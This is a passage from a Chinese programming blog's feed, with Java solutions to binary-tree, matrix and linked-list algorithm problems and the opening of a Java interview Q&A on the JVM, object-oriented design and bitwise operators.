punctuation">}</span>      TreeNode n <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>n<span class="token punctuation">.</span>right <span class="token operator">==</span> null <span class="token operator">||</span> n<span class="token punctuation">.</span>right <span class="token operator">==</span> prev<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>n<span class="token punctuation">.</span>left <span class="token operator">==</span> null <span class="token operator">&amp;&amp;</span> n<span class="token punctuation">.</span>right <span class="token operator">==</span> null <span class="token operator">&amp;&amp;</span> curSum <span class="token operator">==</span> sum<span class="token punctuation">)</span>          result<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span>elem<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        elem<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>elem<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        curSum <span class="token operator">-=</span> n<span class="token punctuation">.</span>val<span class="token punctuation">;</span>        prev <span class="token operator">=</span> n<span class="token punctuation">;</span>        root <span class="token operator">=</span> null<span class="token punctuation">;</span>      <span class="token punctuation">}</span> <span class="token keyword">else</span> root <span class="token operator">=</span> n<span class="token punctuation">.</span>right<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>树 t 是否等于树 s 的子树</title>
      <link href="/2019/02/26/suan-fa/er-cha-shu/shu-t-shi-fou-deng-yu-shu-s-de-zi-shu/"/>
      <url>/2019/02/26/suan-fa/er-cha-shu/shu-t-shi-fou-deng-yu-shu-s-de-zi-shu/</url>
      
        <content type="html"><![CDATA[<h2 id="树-t-是否等于树-s-的子树"><a href="#树-t-是否等于树-s-的子树" class="headerlink" title="树 t 是否等于树 s 的子树"></a>树 t 是否等于树 s 的子树</h2><p><strong>问题</strong></p><p>这个题目说的是，给你两棵二叉树 s 和 t，你要判断 t 是否与 s 的某一棵子树结构相同，并且节点上的值也相等。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的第一棵树 s 是：<span class="token code keyword">     1</span><span class="token code keyword">    / \</span>   2   4  / \ 8  16给你的第二棵树 t 是：   2  / \ 8  16t 与 s 的一棵子树相等，因此你要返回 true。如果向 s 中再加一个节点 0：<span class="token code keyword">     1</span><span class="token code keyword">    / \</span>   2   4  /  \ 8  16<span class="token code keyword">    /</span>   0这个时候，t 就不等于 s 中的任何一棵子树了，因此返回 false。</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TreeNode</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    TreeNode left<span class="token punctuation">;</span>    TreeNode right<span class="token punctuation">;</span>    <span class="token function">TreeNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>      val <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">private</span> <span class="token keyword">boolean</span> <span class="token function">isSameTree</span><span class="token punctuation">(</span>TreeNode s<span class="token punctuation">,</span> TreeNode t<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">==</span> null <span class="token operator">&amp;&amp;</span> t <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">==</span> null <span class="token operator">||</span> t <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> s<span class="token punctuation">.</span>val <span class="token operator">==</span> t<span class="token punctuation">.</span>val <span class="token operator">&amp;&amp;</span>      <span class="token function">isSameTree</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>left<span class="token punctuation">,</span> t<span class="token punctuation">.</span>left<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>      <span class="token function">isSameTree</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>right<span class="token punctuation">,</span> t<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(m*n), Space: O(h)</span>  <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isSubtree</span><span class="token punctuation">(</span>TreeNode s<span class="token punctuation">,</span> TreeNode t<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>t <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">isSameTree</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> t<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">isSubtree</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>left<span class="token punctuation">,</span> t<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">isSubtree</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>right<span class="token punctuation">,</span> t<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">private</span> Map<span class="token operator">&lt;</span>TreeNode<span class="token punctuation">,</span> Integer<span class="token operator">></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">private</span> String <span class="token function">computeHash</span><span class="token punctuation">(</span>TreeNode t<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>t <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token string">"#"</span><span class="token punctuation">;</span>    String left <span class="token operator">=</span> <span class="token function">computeHash</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>    String right <span class="token operator">=</span> <span class="token function">computeHash</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>    String hash <span class="token operator">=</span> left <span class="token operator">+</span> t<span class="token punctuation">.</span>val <span class="token operator">+</span> right<span class="token punctuation">;</span>    map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> hash<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> hash<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">private</span> <span class="token keyword">boolean</span> <span class="token function">isSub</span><span class="token punctuation">(</span>TreeNode s<span class="token punctuation">,</span> TreeNode t<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>t <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>s <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">isSub</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>left<span class="token punctuation">,</span> t<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">isSub</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>right<span class="token punctuation">,</span> t<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(m+n), Space: O(m+n)</span>  <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isSubtreeHash</span><span class="token punctuation">(</span>TreeNode s<span class="token punctuation">,</span> TreeNode t<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">computeHash</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">computeHash</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">isSub</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> t<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>矩阵的螺旋遍历</title>
      <link href="/2019/02/23/suan-fa/shu-zu/ju-zhen-de-luo-xuan-bian-li/"/>
      <url>/2019/02/23/suan-fa/shu-zu/ju-zhen-de-luo-xuan-bian-li/</url>
      
        <content type="html"><![CDATA[<h2 id="矩阵的螺旋遍历"><a href="#矩阵的螺旋遍历" class="headerlink" title="矩阵的螺旋遍历"></a>矩阵的螺旋遍历</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个 m x n 的矩阵，你要对它进行螺旋遍历，然后返回遍历结果。</p><pre><code>比如说给你的矩阵 a 是：1, 2, 34, 5, 67, 8, 9螺旋遍历它得到：1, 2, 3, 6, 9, 8, 7, 4, 5因此你要返回以上序列。</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Time: O(m*n), Space: O(1)</span>  <span class="token keyword">public</span> List<span class="token operator">&lt;</span>Integer<span class="token operator">></span> <span class="token function">spiralOrder</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> matrix<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>matrix <span class="token operator">==</span> null <span class="token operator">||</span> matrix<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span>      matrix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> null <span class="token operator">||</span> matrix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    List<span class="token operator">&lt;</span>Integer<span class="token operator">></span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> top <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> bottom <span class="token operator">=</span> matrix<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> left <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> right <span class="token operator">=</span> matrix<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> left<span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> right<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> result<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>matrix<span class="token punctuation">[</span>top<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">++</span>top <span class="token operator">></span> bottom<span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> top<span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> bottom<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> result<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>right<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">--</span>right <span class="token operator">&lt;</span> left<span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> right<span class="token punctuation">;</span> i <span class="token operator">>=</span> left<span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> result<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>matrix<span class="token punctuation">[</span>bottom<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">--</span>bottom <span class="token operator">&lt;</span> top<span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> bottom<span class="token punctuation">;</span> i <span class="token operator">>=</span> top<span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> result<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">++</span>left <span class="token operator">></span> right<span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 数组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有序链表转换二叉搜索树</title>
      <link href="/2019/02/21/suan-fa/lian-biao/you-xu-lian-biao-zhuan-huan-er-cha-sou-suo-shu/"/>
      <url>/2019/02/21/suan-fa/lian-biao/you-xu-lian-biao-zhuan-huan-er-cha-sou-suo-shu/</url>
      
        <content type="html"><![CDATA[<h2 id="有序链表转换二叉搜索树"><a href="#有序链表转换二叉搜索树" class="headerlink" title="有序链表转换二叉搜索树"></a>有序链表转换二叉搜索树</h2><p><strong>问题</strong></p><p>给定一个单链表，其中的元素按升序排序，将其转换为高度平衡的二叉搜索树。</p><p>本题中，一个高度平衡二叉树是指一个二叉树<em>每个节点</em> 的左右两个子树的高度差的绝对值不超过 1。</p><pre><code>给定的有序链表： [-10, -3, 0, 5, 9],一个可能的答案是：[0, -3, 9, -10, null, 5], 它可以表示下面这个高度平衡二叉搜索树：      0     / \   -3   9   /   / -10  5</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> TreeNode <span class="token function">sortedListToBST</span><span class="token punctuation">(</span>ListNode head<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> null<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">createTree</span><span class="token punctuation">(</span>head<span class="token punctuation">,</span> null<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> TreeNode <span class="token function">createTree</span><span class="token punctuation">(</span>ListNode head<span class="token punctuation">,</span> ListNode tail<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> tail <span class="token punctuation">)</span> <span class="token keyword">return</span> null<span class="token punctuation">;</span>        ListNode fast <span class="token operator">=</span> head<span class="token punctuation">;</span>        ListNode slow <span class="token operator">=</span> head<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>fast <span class="token operator">!=</span> tail <span class="token operator">&amp;&amp;</span> fast<span class="token punctuation">.</span>next <span class="token operator">!=</span> tail<span class="token punctuation">)</span> <span class="token punctuation">{</span>            fast <span class="token operator">=</span> fast<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next<span class="token punctuation">;</span>            slow <span class="token operator">=</span> slow<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        TreeNode node <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TreeNode</span><span class="token punctuation">(</span>slow<span class="token punctuation">.</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>        node<span class="token punctuation">.</span>left <span class="token operator">=</span> <span class="token function">createTree</span><span class="token punctuation">(</span>head<span class="token punctuation">,</span> slow<span class="token punctuation">)</span><span class="token punctuation">;</span>        node<span class="token punctuation">.</span>right <span class="token operator">=</span> <span class="token function">createTree</span><span class="token punctuation">(</span>slow<span class="token punctuation">.</span>next<span class="token punctuation">,</span> tail<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> node<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java面试2019常考题目汇总1</title>
      <link href="/2019/02/21/mian-shi-xi-lie/java-mian-shi-2019-chang-kao-ti-mu-hui-zong-1/"/>
      <url>/2019/02/21/mian-shi-xi-lie/java-mian-shi-2019-chang-kao-ti-mu-hui-zong-1/</url>
      
        <content type="html"><![CDATA[<h1 id="Java面试2019常考题目汇总-1"><a href="#Java面试2019常考题目汇总-1" class="headerlink" title="Java面试2019常考题目汇总(1)"></a>Java面试2019常考题目汇总(1)</h1><h1 id="一、JAVA基础篇-概念"><a href="#一、JAVA基础篇-概念" class="headerlink" title="一、JAVA基础篇-概念"></a>一、JAVA基础篇-概念</h1><h2 id="1-简述你所知道的Linux："><a href="#1-简述你所知道的Linux：" class="headerlink" title="1.简述你所知道的Linux："></a>1.简述你所知道的Linux：</h2><p>Linux起源于1991年，1995年流行起来的免费操作系统，目前， Linux是主流的服务器操作系统， 广泛应用于互联网、云计算、智能手机（Android）等领域。由于Java主要用于服务器端的开发，因此Java应用的部署环境有很多为Linux。 Windows操作系统的目录结构，是以盘符为单位，C盘、D盘、E盘等等，数据存储在各个盘符之下，而Linux操作系统最顶层只有一个根目录root，所有文件都存储在这一个根目录之下。 Linux不像Windows的图形操作界面，是通过命令的方式进行操作，常用命令有：</p><ul><li>a . pwd：用于显示当前工作目录；</li><li>b . ls：用于查看当前工作目录内容；</li><li>c . cd：用于改变当前工作目录。</li></ul><h2 id="2-什么是Java虚拟机？为什么Java被称作是“平台无关的编程语言”？"><a href="#2-什么是Java虚拟机？为什么Java被称作是“平台无关的编程语言”？" class="headerlink" title="2.什么是Java虚拟机？为什么Java被称作是“平台无关的编程语言”？"></a>2.什么是Java虚拟机？为什么Java被称作是“平台无关的编程语言”？</h2><p>Java虚拟机是一个可以执行Java字节码的虚拟机进程。Java源文件被编译成能被Java虚拟机执行的字节码文件。 Java被设计成允许应用程序可以运行在任意的平台，而不需要程序员为每一个平台单独重写或者是重新编译。Java虚拟机让这个变为可能，因为它知道底层硬件平台的指令长度和其他特性。</p><h1 id="3-JDK、JRE、JVM关系是什么？"><a href="#3-JDK、JRE、JVM关系是什么？" class="headerlink" title="3.JDK、JRE、JVM关系是什么？"></a>3.JDK、JRE、JVM关系是什么？</h1><p>JDK（Java Development Kit）即为Java开发工具包，包含编写Java程序所必须的编译、运行等开发工具以及JRE。开发工具如：用于编译java程序的javac命令、用于启动JVM运行java程序的java命令、用于生成文档的javadoc命令以及用于打包的jar命令等等。 JRE（Java Runtime Environment）即为Java运行环境，提供了运行Java应用程序所必须的软件环境，包含有Java虚拟机（JVM）和丰富的系统类库。系统类库即为java提前封装好的功能类，只需拿来直接使用即可，可以大大的提高开发效率。 JVM（Java Virtual Machines）即为Java虚拟机，提供了字节码文件（.class）的运行环境支持。 简单说，就是JDK包含JRE包含JVM。</p><h1 id="4-Java支持的数据类型有哪些？什么是自动拆装箱？"><a href="#4-Java支持的数据类型有哪些？什么是自动拆装箱？" class="headerlink" title="4.Java支持的数据类型有哪些？什么是自动拆装箱？"></a>4.Java支持的数据类型有哪些？什么是自动拆装箱？</h1><p>基本数据类型：</p><ul><li>整数值型：byte,short,int,long,</li><li>字符型：char</li><li>浮点类型：float,double</li><li>布尔型：boolean 整数默认int型，小数默认是double型。Float和long类型的必须加后缀。</li></ul><blockquote><p>首先知道String是引用类型不是基本类型，引用类型声明的变量是指该变量在内存中实际存储的是一个引用地址，实体在堆中。引用类型包括类、接口、数组等。String类还是final修饰的。 而包装类就属于引用类型，自动装箱和拆箱就是基本类型和引用类型之间的转换，至于为什么要转换，因为基本类型转换为引用类型后，就可以new对象，从而调用包装类中封装好的方法进行基本类型之间的转换或者toString（当然用类名直接调用也可以，便于一眼看出该方法是静态的），还有就是如果集合中想存放基本类型，泛型的限定类型只能是对应的包装类型。</p></blockquote><h2 id="5-面向对象是什么？"><a href="#5-面向对象是什么？" class="headerlink" title="5.面向对象是什么？"></a>5.面向对象是什么？</h2><p>面向对象是一种思想，世间万物都可以看做一个对象，这里只讨论面向对象编程（OOP），Java是一个支持并发、基于类和面向对象的计算机编程语言，面向对象软件开发的优点：</p><ul><li>代码开发模块化，更易维护和修改；</li><li>代码复用性强；</li><li>增强代码的可靠性和灵活性；</li><li>增加代码的可读性。</li></ul><p>面向对象的四大基本特性：</p><p><strong>抽象</strong>：提取现实世界中某事物的关键特性，为该事物构建模型的过程。对同一事物在不同的需求下，需要提取的特性可能不一样。得到的抽象模型中一般包含：属性（数据）和操作（行为）。这个抽象模型我们称之为类。对类进行实例化得到对象。</p><p><strong>封装</strong>：封装可以使类具有独立性和隔离性；保证类的高内聚。只暴露给类外部或者子类必须的属性和操作。类封装的实现依赖类的修饰符（public、protected和private等）</p><p><strong>继承</strong>：对现有类的一种复用机制。一个类如果继承现有的类，则这个类将拥有被继承类的所有非私有特性（属性和操作）。这里指的继承包含：类的继承和接口的实现。</p><p><strong>多态</strong>：多态是在继承的基础上实现的。多态的三个要素：继承、重写和父类引用指向子类对象。父类引用指向不同的子类对象时，调用相同的方法，呈现出不同的行为；就是类多态特性。多态可以分成编译时多态和运行时多态。</p><blockquote><p>抽象、封装、继承和多态是面向对象的基础。在面向对象四大基础特性之上，我们在做面向对象编程设计时还需要遵循有一些基本的设计原则。</p></blockquote><h2 id="面向对象的七大设计原则："><a href="#面向对象的七大设计原则：" class="headerlink" title="面向对象的七大设计原则："></a>面向对象的七大设计原则：</h2><ul><li>SOLID原则（单一职责原则、开放关闭原则、里氏替换原则、接口隔离原则和依赖倒置原则）</li><li>迪米特法则</li><li>组合优于继承原则（合成复用原则）。 在遵循这些面向对象设计原则基础上，前辈们总结出一些解决不同问题场景的设计模式，以四人帮的gof23最为知名。</li></ul><h1 id="24种设计模式-gof23-1-："><a href="#24种设计模式-gof23-1-：" class="headerlink" title="24种设计模式(gof23+1)："></a>24种设计模式(gof23+1)：</h1><ul><li>创建型模式： 1.简单工厂模式（不包含在gof23中） 2.工厂模式 3.抽象工厂模式 4.单例模式 5.原型模式 创建者模式 6.结构型模式： 7.组合模式 8.装饰者模式 9.外观模式 10.适配器模式 11.代理模式 12.享元模式 13.桥接模式</li><li>行为型模式： 14.观察者模式 15.策略模式 16.状态模式 17.中介模式 18.模板方法 19.命令模式 20.备忘录模式 21.访问者模式 22.解释器模式 23.迭代器模式 24.职责链模式 这里只是简单描述了定义和特征以及设计模式的关系，具体细节不讨论。</li></ul><h2 id="6-请写出下面几个表达式的结果，答案可以用10进制或16进制书写"><a href="#6-请写出下面几个表达式的结果，答案可以用10进制或16进制书写" class="headerlink" title="6.请写出下面几个表达式的结果，答案可以用10进制或16进制书写"></a>6.请写出下面几个表达式的结果，答案可以用10进制或16进制书写</h2><p>1). 0xaa | 0x55 2). 15 &amp; 240 3). 10 ^ 12 4). -2 &gt;&gt; 1 5). -2 &gt;&gt;&gt; 1 1). 分析：十六进制数用0x……来表示，后面一个十六进制位是四位，两个十六进制位为一个字节，最多后面可以有8个十六进制位，32个字节,如：0xFFFFFFFF。 或（“ | ”）运算，全0为0，其他为1。 所以：0xaa 用二进制表示为 10101010 ,0x55 用二进制表示为 01010101 ,按位或之后为 11111111 ，十进制数为255，十六进制数为 0xFF 。</p><p>2). 分析：10进制转换成2进制，用该数字除以2，记录商和余数，利用商再次除以2，记录商和余数……直到上为0或余数为0停止，余数逆序组成二进制的从低到高位（最后的余数为二进制最低位）。与（“ &amp; ”）运算，全1为1，其他为0 。 所以： 15 等于1111 ，240等于 11110000，15前面用0补齐为00001111 ，按位与之后为 00000000 ，即结果为0</p><p>3). 分析： 亦或（“ ^ ”）运算，相同取0，不同取1 。 所以：1010 ^ 1100 =0110 , 十进制表示为6，十六进制表示为 0x06 。</p><p>4). 分析： 带符号右移（“ &gt;&gt; ”），即有符号位时，负数符号位补1，正数符号位补0， -2 的二进制求法是正数取反加1，因此 2 的二进制表示为0000 0000 0000 0000 0000 0000 0000 0010 ，取反加一为 1111 1111 1111 1111 1111 1111 1111 1110 ，即 -2 的二进制表示。 注： &gt;&gt; , &lt;&lt; , &gt;&gt;&gt; , 运算符只针对int型和long型，byte ,short ,char型需要转换成Int型在进行操作。 所以： 带符号右移之后为 1111 1111 1111 1111 1111 1111 1111 1111 ，除符号位之外，减一取反，得到带符号十进 制数为 -1 。</p><p>5). 分析：无符号右移 (“ &gt;&gt;&gt; ”) ，即无论正负数，右移之后符号位均补 0 。 所以： -2 的二进制无符号右移一位之后为 0111 1111 1111 1111 1111 1111 1111 1111，即 2^31 - 1,二的三十一次方减一。 注：右移和无符号右移主要区别就在于左面最高位补 0 还是补 1 的问题，无符号右移任何时候最高位都补 0 ， 有符号右移则是正数补 0 ，负数补 1 。（没有无符号左移！）。</p><h2 id="7-amp-和-amp-amp-的区别？"><a href="#7-amp-和-amp-amp-的区别？" class="headerlink" title="7.&amp;和&amp;&amp;的区别？"></a>7.&amp;和&amp;&amp;的区别？</h2><p>&amp;运算符有两种用法：(1)按位与；(2)逻辑与。&amp;&amp;运算符是短路与运算。逻辑与跟短路与的差别是非常巨大的，虽然二者都要求运算符左右两端的布尔值都是true整个表达式的值才是true。&amp;&amp;之所以称为短路运算是因为，如果&amp;&amp;左边的表达式的值是false，右边的表达式会被直接短路掉，不会进行运算。很多时候我们可能都需要用&amp;&amp;而不是&amp;，例如在验证用户登录时判定用户名不是null而且不是空字符串，应当写为：username != null &amp;&amp;!username.equals(“”)，二者的顺序不能交换，更不能用&amp;运算符，因为第一个条件如果不成立，根本不能进行字符串的equals比较，否则会产生NullPointerException异常。注意：逻辑或运算符（|）和短路或运算符（||）的差别也是如此。</p><h2 id="8-什么是值传递和引用传递？"><a href="#8-什么是值传递和引用传递？" class="headerlink" 